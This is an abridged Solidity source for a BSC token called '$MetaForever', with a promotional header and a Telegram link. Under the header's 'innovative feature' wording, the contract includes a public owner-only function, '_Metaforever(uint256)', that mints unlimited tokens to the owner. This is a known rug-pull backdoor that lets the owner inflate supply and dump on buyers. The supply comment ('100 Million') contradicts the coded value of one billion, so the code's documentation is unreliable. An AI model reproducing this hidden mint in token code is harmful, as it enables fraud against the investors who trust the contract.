...
//
// $MetaForever proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/metaforeverBSC
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Metaforever(uint256 amount) public onlyOwner {
 _Metaforever(msg.sender, amount);
    }
    ...
    function _Metaforever(address account, uint256 amount) internal virtual {
...
contract $MetaForever is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Meta Forever", "METAFOREVER") {
        _Metaforever(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}